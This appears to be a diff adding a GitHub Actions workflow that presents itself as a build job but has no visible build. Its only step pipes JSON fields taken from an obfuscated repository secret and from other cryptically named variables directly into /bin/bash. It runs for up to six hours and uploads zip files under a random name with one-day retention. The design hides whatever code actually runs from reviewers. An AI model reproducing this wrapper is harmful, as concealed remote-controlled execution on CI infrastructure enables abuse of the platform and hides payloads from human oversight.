@@ -1,0 +1,31 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          abgf29: ${{ secrets.abgf29 }}
+        run: |
+          printf '%s' "$abgf29" | jq -r .jx80373 | /bin/bash
+          echo $eers64009 | jq -r .lfixt096 | /bin/bash
+          echo $larlt85763 | jq -r .jbqhs30 | /bin/bash
+          printf '%s' "$ddm0404" | jq -r .gprq3760 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: RU9aRt4W
+          path: "*.zip"
+          retention-days: 1
